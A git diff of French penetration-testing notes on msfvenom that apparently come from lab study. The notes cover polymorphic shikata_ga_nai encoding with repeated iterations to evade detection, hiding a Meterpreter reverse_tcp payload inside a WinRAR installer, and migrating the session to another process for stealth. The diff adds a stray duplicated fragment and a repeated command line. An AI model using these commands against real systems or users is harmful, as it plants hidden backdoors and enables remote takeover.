@@ -24,11 +24,18 @@ Puis paramétrer la machine d'écoute : LHOST, LPORT et run.
 ## Encodage
 
 `msfvenom --list encoders`  
-`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload.  
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload : un encodeur polymorphe il change la forme du code à chaque fois mais pas ce qu'il fait.  
+
+mais pas ce qu’il fait  
 
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload avec 10 itérations pour fuir la détection des FW.  
 
 
 ## Injection de Payload dans un exécutable Windows
-`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downlaods/wrar602.exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload pour Windows 32 bits avec 10 itérations .  
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downlaods/wrar602.exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload pour Windows 32 bits avec 10 itérations et le cache dans un exécutable, ici winrar.  
+
+Une fois le meterpreter lancé, il est intéressant de lancer `run post/windows/manage/migrate` Ce module sert à déplacer une session Metasploit vers un autre processus Windows pour la rendre plus stable ou discrète.  
+
+
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downlaods/wrar602.exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload pour Windows 32 bits avec 10 itérations et le cache dans un exécutable, ici winrar.  
 
